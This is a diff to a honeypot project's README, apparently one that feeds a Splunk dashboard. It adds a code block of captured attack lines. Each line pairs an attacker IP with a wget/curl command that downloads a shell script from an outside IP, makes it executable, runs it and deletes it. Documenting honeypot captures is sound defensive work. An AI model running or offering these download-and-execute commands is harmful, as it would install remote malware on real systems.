@@ -191,11 +191,15 @@ After running these, refresh your dashboard. You should see:
 3. **Payload Table:** You should see a mix of clean URLs and raw commands.
 
 If you expose to the internet with e.g. port forwading in your home router, you will get some basic scanners, but also some advanced attacks as listed below:
+
+```
 45.38.44.221  wget 41.216.189.156/1.sh; curl -O 41.216.189.156/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh
 193.142.146.230  wget 109.111.55.221/ok; curl -O 109.111.55.221/ok; chmod 777 ok; sh ok; rm -rf ok; rm -rf ok.*
 45.38.44.221   wget 41.216.189.156/1.sh; curl -O 41.216.189.156/1.sh; chmod 777 1.sh; sh 1.sh; rm -rf 1.sh; rm -rf 1.sh
 193.142.146.230  cd /tmp; wget 109.111.55.221/ok; curl -O 109.111.55.221/ok; chmod 777 ok; sh ok; rm -rf ok; rm -rf ok.*
-![splunk_honeypot_19Dec2025_1.png](/splunk_honeypot_19Dec2025_1.png
+
+```
+![splunk_honeypot_19Dec2025_1.png](/splunk_honeypot_19Dec2025_1.png)
 ![splunk_honeypot_19Dec2025_2.png](/splunk_honeypot_19Dec2025_2.png)
 
 
